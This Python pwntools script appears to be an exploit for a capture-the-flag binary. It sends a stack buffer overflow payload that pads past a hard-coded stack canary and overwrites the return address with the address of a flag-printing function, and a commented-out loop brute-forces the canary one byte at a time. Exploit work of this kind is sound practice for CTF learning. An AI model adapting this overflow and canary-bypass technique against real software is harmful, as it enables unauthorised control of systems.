from pwn import *
import sys

argv = sys.argv

DEBUG = False
BINARY = argv[1]
elf = ELF(BINARY)
FLAG_ADDR = elf.symbols['tweet_tweet']


context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
	gdb.attach(sh)


if DEBUG:
	context.log_level = 'debug'

def connect():
	if len(argv) < 3:
		stdout = process.PTY
		stdin = process.PTY

		sh = process(BINARY, stdout=stdout, stdin=stdin)

		if DEBUG:
			attach_gdb()

		REMOTE = False
	else:
		NC = sys.argv[2]
		ip = NC.split(":")[0]
		port = int(NC.split(":")[1])
		sh = remote(ip, port)
		REMOTE = True
	return sh

# Cool!
splash()

# Connect to local/remote process
sh = connect()

# Send payload
canary = b'\x4e\x45\x43\x47\x4c\x53\x50\x51'
payload = b'A' * 32 + canary + b'A' * 20 + p32(FLAG_ADDR)
sh.sendlineafter('> ', str(len(payload)))
sh.sendlineafter('> ', payload)

# for c in range(256):
# 	sh = connect()
# 	sh.sendlineafter('> ', b'41')
# 	sh.sendlineafter('> ', b'A' * 32 + key + bytes([c]))
# 	data = sh.recvall()
# 	print(data)
# 	if b'Stack Smashing Detected' not in data:
# 		print(hex(c))
# 		break

# Open shell
sh.interactive()

